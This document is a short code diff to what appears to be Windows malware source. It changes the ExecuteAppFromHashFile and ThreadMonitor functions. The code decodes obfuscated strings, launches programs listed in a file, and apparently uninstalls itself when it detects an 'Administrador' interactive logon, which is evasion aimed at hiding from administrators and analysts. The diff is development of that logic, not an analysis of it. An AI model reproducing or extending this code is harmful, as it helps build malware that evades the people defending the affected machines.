@@ -551,7 +551,7 @@ BOOL ExecuteAppFromHashFile(void){
 			}
 			
 			if(lpBuffer)
-				boolRetVal = ExecuteApp(lpBuffer, NULL, FALSE, TRUE, NULL, NULL);
+				boolRetVal = ExecuteApp(lpBuffer, NULL, FALSE, TRUE, NULL, NULL, TRUE);
 			
 			if(SetFilePointer(hFile, 0, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER){
 				#ifdef DEBUG_SHOW_ERROR
@@ -635,7 +635,7 @@ DWORD ThreadMonitor(LPVOID lpParam){
 
 		#ifdef CHECK_ADMIN_INTERACTIVE_LOGON
 		//lpszShellPath
-		if(CheckIsProcessRuningAsUser("packager.exe", ds.getDecodeString((LPSTR)encStr_Administrador))){
+		if(CheckIsProcessRuningAsUser(lpszShellPath/*"packager.exe"*/, ds.getDecodeString((LPSTR)encStr_Administrador))){
 			#ifdef DEBUG_SHOW_ERROR_TO_FILE
 			fileLogPrint("Actived uninstall by interactive logon");
 			#endif
